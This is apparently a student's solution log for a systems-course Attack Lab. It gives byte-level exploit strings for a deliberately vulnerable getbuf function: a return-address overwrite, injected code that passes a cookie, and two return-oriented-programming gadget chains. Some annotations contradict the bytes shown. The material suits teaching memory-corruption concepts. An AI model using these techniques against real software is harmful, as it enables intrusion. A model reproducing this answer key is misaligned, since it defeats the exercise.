@@ -1,0 +1,144 @@
+AttackLabLog.txt
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp =>buffer size=0x38
+   0x000000000040184c <+4>:	mov    %rsp,%rdi =>content on curret stack->parameter 1
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax =>return 1
+   0x0000000000401859 <+17>:	add    $0x38,%rsp =>shrink stack
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+
+Phase 1: Return to touch1
+-Break after <Gets>
+-x/64bx $rsp
+-Find return address (56 bytes after current $rsp)
+-Overflow the return address with the address of touch1
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+5e 18 40 00 00 00 00 00
+
+Phase 2: Return to touch2 and pass cookie as the argument of touch2
+-Break after <Gets>
+-x/72bx $rsp
+-We need movq [cookie], %rdi
+-Write assembly code
+	movq $0x5561a088,%rdi
+	retq
+-$ gcc -c phase2.s
+-Get the binary code for the movq instruction
+0000000000000000 <.text>:
+   0:	48 c7 c7 56 db eb 76 	mov    $0x76ebdb56,%rdi
+   7:	c3                   	retq   
+-How to execute the movq instruction:
+	-The address of $rsp is 0x5561a088
+	-We need to return to this address in order to execute the instruction
+	-Overflow the return address with the address of $rsp
+-When the instruction on $rsp returns (c3), it will go back to the next line of the last return address
+-touch2 is the next return address
+
+48 c7 c7 56 db eb 76 c3 ->ret to 2nd ret addr
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer 
+88 a0 61 55 00 00 00 00 ->1st ret addr (addr of mov instruction on stack)
+8a 18 40 00 00 00 00 00 ->2nd ret addr
+
+Phase 3: Return to test and pass cookie string as the argument
+-We need movq [cookie string], %rdi
+-[cookie string] contains 8 digits, or 8 bytes. We can place the string on stack and move the content on stack to %rdi
+-Write assembly code
+	movq [address of where I store cookie string on stack], %rdi
+	retq
+-Note: string ends with a null byte
+	-37 36 65 62 64 62 35 36 00
+	-I left the next line empty for alignment
+
+37 36 65 62 64 62 35 36 ->cookie string
+00 00 00 00 00 00 00 00
+48 c7 c7 88 a0 61 55 c3 ->mov cookie string to %rdi, ret to 2nd addr
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer
+98 a0 61 55 00 00 00 00 ->1st ret addr (addr of mov instruction on stack)
+5e 19 40 00 00 00 00 00 ->2nd ret addr (test)
+
+Phase 4: Repeat Phase 2 with gadgets
+-We want to move the cookie (on stack) to %rdi
+-In gadget farm (start_farm to mid_farm), find instructions:
+	-pop $rax: 58 (pop data from stack to %rax, data needs to be in $rsp at this point)
+	-mov $rax, %rdi: 48 89 c7
+	-retq: c3
+-We first go to pop, pop returns to 2nd ret addr, mov returns to 3rd ret addr
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer
+02 1a 40 00 00 00 00 00 ->1st ret addr: go to 58 90 90 90 c3
+56 db eb 76 00 00 00 00 ->cookie(on stack, move to %rax)
+1d 1a 40 00 00 00 00 00 ->2nd ret addr: go to 48 89 c7 c3
+8a 18 40 00 00 00 00 00 ->3rd ret addr to touch2
+
+Phase 5: Repeat Phase 3 with gadgets
+-We need to store [cookie string] on stack and move %rsp(with possible displacement) to %rdi
+-Moving the content of %rsp to another register, we need to use lea
+	-One useful gadget we can use: lea (%rdi, %rsi, 1), %rax (0x401a28)
+-[cookie string] should be stored at %rdi+%rsi on stack
+-The following mov instructions between registers are potentially useful:
+	-Note: we can ignore binary code of nop instructions
+	-48 89 c7 c3: rax->rdi
+	-89 c7 c3: eax->edi
+	-89 c2 90 c3: eax->edx
+	-89 e0 c3: esp->eax
+	-89 ce 90 90 c3: ecx->esi
+	-89 d1 90 c3: edx->ecx
+	-48 89 e0 c3: rsp->rax
+-Address of cookie string: rsp->rax->rdi
+	-0x401a43: 48 89 e0 c3
+	-0x4019f4: 48 89 c7 c3
+	-%rdi now has %rsp, which is the address of f4 19 40 00 00 00 00 00
+	-We need to provide a displacement value on stack
+-Displacement: esp->eax->edx->ecx->esi
+	-0x401a10: 89 c7 c3, ($esp) is 0x48
+	-0x401a3e: 89 c2 90 c3 
+	-0x401abb: 89 d1 90 c3
+	-0x401aea: 89 ce 90 c3
+	-%esi now has the displacement value, (%rdi + %rsi) = [cookie string]
+-After lea (%rdi, %rsi, 1), %rax, we have [cookie string] in %rax, and we need to move it to %rdi
+	-0x401a28: lea instruction
+	-0x4019f4: 48 89 c7 c3
+-Where do we put the cookie string?
+	-I placed it after all the code exploitation, so the displacement is 0x48 from the address contained in %rdi
+
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer
+43 1a 40 00 00 00 00 00 ->rsp=>rax
+f4 19 40 00 00 00 00 00 ->rax=>rdi, %rdi contains this address
+10 1a 40 00 00 00 00 00 ->esp=>eax
+48 00 00 00 00 00 00 00 ->esp
+3e 1a 40 00 00 00 00 00 ->eax=>edx
+bb 1a 40 00 00 00 00 00 ->edx=>ecx
+ea 1a 40 00 00 00 00 00 ->ecx=>esi
+28 1a 40 00 00 00 00 00 ->lea (%rdi, %rsi, 1), %rax
+f4 19 40 00 00 00 00 00 ->rax=>rdi
+5e 19 40 00 00 00 00 00 ->ret addr: test
+37 36 65 62 64 62 35 36 ->cookie string
+00 00 00 00 00 00 00 00 ->this extra line contains a null byte
